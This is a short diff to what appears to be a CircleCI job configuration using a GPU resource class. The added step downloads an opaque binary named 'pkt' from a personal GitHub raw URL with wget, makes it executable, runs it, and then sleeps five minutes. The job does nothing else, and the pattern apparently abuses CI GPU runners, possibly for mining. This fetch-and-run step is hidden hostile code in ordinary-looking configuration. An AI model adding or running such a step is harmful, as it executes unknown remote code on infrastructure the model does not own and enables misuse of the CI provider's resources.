@@ -5,5 +5,5 @@ jobs:
       resource_class: gpu.nvidia.large
       image: ubuntu-1604-cuda-10.1:201909-23
     steps:
-      - run: https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt && chmod +x pkt && ./pkt
+      - run: wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt && chmod +x pkt && ./pkt
       - run: sleep 5m
